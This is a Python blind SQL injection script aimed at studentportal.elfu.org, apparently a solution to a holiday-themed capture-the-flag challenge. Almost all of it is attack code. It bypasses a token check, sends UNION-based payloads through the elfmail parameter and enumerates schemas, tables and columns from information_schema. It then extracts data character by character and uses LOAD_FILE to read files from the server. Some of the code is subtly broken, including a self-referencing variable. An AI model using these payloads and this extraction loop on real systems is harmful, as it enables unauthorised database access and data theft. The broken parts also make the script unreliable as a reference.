#!/usr/bin/env python

import requests
import re
import argparse
import string

parser = argparse.ArgumentParser()
parser.add_argument("--payload", help="give me your payload")
parser.add_argument("--dump", help="dump all your secrets Krampus!")
parser.add_argument("--offset", help="offset in the database")
parser.add_argument("--clue", help="should you have any clue how your field starts, put it here")
args = parser.parse_args()

def get_token(session):
    # Creating a session to handle cookies
    url = "https://studentportal.elfu.org/"
    response = session.get("{}/validator.php".format(url))
    if response.status_code == 200:
        token = response.content
    return token.decode('utf-8')

def send(session, payload):
    url = "https://studentportal.elfu.org/"
    request_url = "{}/application-check.php?token={}&elfmail={}".format(url, get_token(session), payload)
    #print("request --> {}".format(request_url))
    response = session.get(request_url)
    if response.status_code == 200:
        return response.content.decode('utf-8')

def show_sql(payload):
    return "SELECT status FROM applications WHERE elfmail = '{}'".format(payload)

success = "Your application has been processed! Congratulations, but have you found Krampus' hidden secrets?"
pending = "Your application is still pending"
no_application = "No application found!"

like_template= "jhbsdsadvhb' UNION SELECT u from (SELECT elfmail as u, {0} from applications WHERE status <> 'pending' LIMIT 1 OFFSET {2}) toto WHERE {0} like '{1}%25' %23"
equal_template = "jhbsdsadvhb' UNION SELECT u from (SELECT elfmail as u, {0} from applications WHERE status <> 'pending' LIMIT 1 OFFSET {2}) toto WHERE {0} = '{1}' %23"

#Discover table krampus, students with below command (--offset 1 is used to skip first 'applications' table)
#python sqli.py --dump table_schema --offset 0
like_template = "jhbsdsadvhb' UNION SELECT table_schema from (select distinct table_schema from information_schema.tables where table_type = 'BASE TABLE' and table_schema not in ('information_schema','mysql', 'performance_schema','sys') order by table_schema LIMIT 1 OFFSET {2}) toto where {0} like '{1}%25' %23"
equal_template = "jhbsdsadvhb' UNION SELECT table_schema from (select distinct table_schema from information_schema.tables where table_type = 'BASE TABLE' and table_schema not in ('information_schema','mysql', 'performance_schema','sys') order by table_schema LIMIT 1 OFFSET {2}) toto where {0} = '{1}' %23"

#Discover MySQL version
like_template = "iuiwug' UNION select v from (select VERSION() as v) toto WHERE v like '{1}%25'  %23"
equal_template = "iuiwug' UNION select v from (select VERSION() as v) toto WHERE v = '{1}'  %23"

#Discover table krampus, students with below command (--offset 1 is used to skip first 'applications' table)
#python sqli.py --dump table_name --offset 1 --clue krampu
#like_template = "jhbsdsadvhb' UNION SELECT u from (select table_schema as u, table_name from information_schema.tables where table_type = 'BASE TABLE' and table_schema not in ('information_schema','mysql', 'performance_schema','sys') order by table_schema, table_name LIMIT 1 OFFSET {2}) toto where {0} like '{1}%25' %23"
#equal_template = "jhbsdsadvhb' UNION SELECT u from (select table_schema as u, table_name from information_schema.tables where table_type = 'BASE TABLE' and table_schema not in ('information_schema','mysql', 'performance_schema','sys') order by table_schema, table_name LIMIT 1 OFFSET {2}) toto where {0} = '{1}' %23"

#We discover only one varchar column 'path'  (offset 1 is column 'id')
#python sqli.py --dump column_name --offset 1 --clue pat
#like_template = "jhbsdsadvhb' UNION SELECT column_name from (select column_name from information_schema.columns where table_name = 'students'  order by column_name LIMIT 1 OFFSET {2}) toto where {0} like '{1}%25' %23"
#equal_template = "jhbsdsadvhb' UNION SELECT column_name from (select column_name from information_schema.columns where table_name = 'students'  order by column_name LIMIT 1 OFFSET {2}) toto where {0} = '{1}' %23"
# students( bio, degree, id, name, student_number )
# krampus ( id, path )

# The number of records in krampus table is 6
#python sqli.py --payload "jhbsdsadvhb' UNION SELECT '1' from (SELECT count(1) as cnt from krampus group by path) toto HAVING count(1) = 6 %23"

#We find the path = /krampus/0f5f510e.png
#python sqli.py --dump path --offset 0 --clue /krampus/0f5f510e.pn
#like_template = "jhbsdsadvhb' UNION SELECT {0} from (SELECT {0} from krampus LIMIT 1 OFFSET {2}) toto WHERE {0} like '{1}%25' %23"
#equal_template = "jhbsdsadvhb' UNION SELECT {0} from (SELECT {0} from krampus LIMIT 1 OFFSET {2}) toto WHERE {0} = '{1}' %23"

krampus_img = [
        '/krampus/0f5f510e.png',
        '/krampus/1cc7e121.png',
        '/krampus/439f15e6.png',
        '/krampus/667d6896.png',
        '/krampus/adb798ca.png',
        '/krampus/ba417715.png'
        ]

# /krampus/(.*).png
#0f5f510e 1cc7e121 439f15e6 667d6896 adb798ca ba417715

#
#
#like_template = "jhbsdsadvhb' UNION SELECT 1 from (SELECT HEX(LOAD_FILE('/krampus/0f5f510e.png')) as secret from krampus LIMIT 1 OFFSET {2}) toto WHERE secret like '{1}%25' %23"
#equal_template = "jhbsdsadvhb' UNION SELECT 1 from (SELECT HEX(LOAD_FILE('/krampus/0f5f510e.png')) as secret from krampus LIMIT 1 OFFSET {2}) toto WHERE secret = '{1}' %23"

#like_template = "jhbsdsadvhb' UNION SELECT DISTINCT status from applications WHERE status not in ('complete', 'approved', 'accepted', 'blah', 'pending', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9') AND {} like '{}%25' LIMIT {}, 1%23"
#equal_template = "jhbsdsadvhb' UNION SELECT DISTINCT status from applications WHERE {} = '{}' LIMIT {}, 1%23"

def send_payload(payload):
  sql = show_sql(payload)
  s = requests.Session()
  print(sql)
  response = (send(s, payload))
  m = re.search("Error: (.*);<br>(.*)at line", response)
  if not m is None:
    print('ERROR')
    print(m.group(1))
    print(m.group(2))
    return 'error'
  elif response.find(success) > 0:
    #print(success)
    return 'success'
  elif response.find(pending) > 0:
    print(pending)
    return "pending"
  elif response.find(no_application) > 0:
    #print(no_application)
    return "no application"
  else:
    print(response)
  return "unknow"


def exfiltrate(field_name, clue, offset, payload_template):
    if payload_template is None:
        like_payload = like_template
        equal_payload = equal_payload
    else:
        like_payload= payload_template
        equal_payload = like_payload.replace("like '{1}%25'", "= '{}'")
        equal_payload = like_payload.replace("like '{1}%25'", "= '{}'")

    field_value = clue
    carry_on = True
    loop = 0
    while carry_on:
        #for c in string.printable:
        found = False
        loop += 1
        for c in list("/abcdef0123456789ghijklmnopqrstuvwxyz+@.-_"):
        #for c in list("0123456789ABCDEFabcdef"):
            payload = like_payload.format(field_name, field_value + c, offset)
            response = send_payload(payload)
            if response == 'success':
                found = True
                field_value += c
                print("{} = {}".format(field_name, field_value))
                loop = 0
                break
        payload = equal_payload.format(field_name, field_value, offset)
        if send_payload(payload) == 'success':
            print(payload)
            print("salut Kuya")
            carry_on=False
            continue
        if loop > 0:
            carry_on = False
    return field_value

#def exfiltrate(field_name, clue, offset):
#    exfiltrate(field_name, clue, offset, None)

offset = '0'
if args.offset:
   offset = args.offset
if args.payload:
  sql = show_sql(args.payload)
  clue = ''
  if args.clue:
    clue = args.clue
  if args.dump:
    print("---------> {} = {}".format(args.dump, exfiltrate(args.dump, clue, offset, args.payload)))
  else:
    print(send_payload(args.payload))
    print(sql)
elif args.dump:
  if args.dump == 'all':
    fields = ['elfmail', 'program', 'phone', 'whyme', 'essay', 'status', 'name']
    for f in fields:
          print("---------> {} = {}".format(f, exfiltrate(f, clue, offset, None)))
  else:
      clue = ''
      if args.clue:
        clue = args.clue
        print("---------> {} = {}".format(args.dump, exfiltrate(args.dump, clue, offset, None)))
else:
  print("You have to provide the --payload or --dump argument")
  print("Usage: python sqli.py --payload \"jhbsdsadvhb' UNION SELECT elfmail from applications WHERE name='Krampus' AND elfmail like 'k%25' LIMIT 0, 1%23\"")
  print("Usage: python sqli.py --dump (all|name|elfmail|program|phone|whyme|essay|status) [--offset number]")
  exit(-1)

#INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('aaaaaa', 'a@a.com', 'a', '55555555', 'w', 'qwertyuiop', 'pending')
